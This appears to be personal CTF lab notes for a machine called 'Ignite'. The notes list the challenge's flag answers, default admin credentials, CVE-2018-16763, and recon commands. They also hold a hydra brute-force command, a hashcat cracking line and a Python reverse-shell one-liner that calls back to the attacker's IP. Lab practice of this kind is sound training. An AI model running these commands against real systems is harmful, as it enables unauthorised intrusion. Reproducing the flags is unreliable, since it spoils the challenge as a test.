---
title: "Ignite"

date: 2022-12-22
url: /ignite/
image: images/2022-thumbs/ignite.png
categories:
  - CTF
tags:
  - CTF
draft: false
---

## Questions
1. User.txt `6470e394cbf6dab6a91682cc8585059b`
2. Root.txt `b9bbcb33e11b80be759c4e844862482d`

---
## Notes
- myIP = 10.18.53.113
- IP = 10.10.27.31

robots.txt = /fuel/

### Exposed Services
```bash
80
```

### Users:Passwords
- admin:admin (found via setup info on http://10.10.27.31)

### Vulnerabilities
- CVE-2018-16763

---
## Commands
`ping $IP`

`sudo nmap -sC -sV -oN scans/initial $IP`

`gobuster dir -u http://10.10.27.31 -w /usr/local/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o scans/gobuster`

`hydra -v -t 30 -l milesdyson -P /usr/local/share/wordlists/rockyou.txt 10.10.27.31 http-post-form "/fuel/login_form:user_name=^USER^&password=^PASS^:Invalid login"`

`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.18.53.113",7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
`

`hashcat -m 110 f4c99eae874755b97610d650be565f1ac42019d1:429c6e14342dd7a63c510007a1858c26 /usr/local/share/wordlists/rockyou.txt` = admin
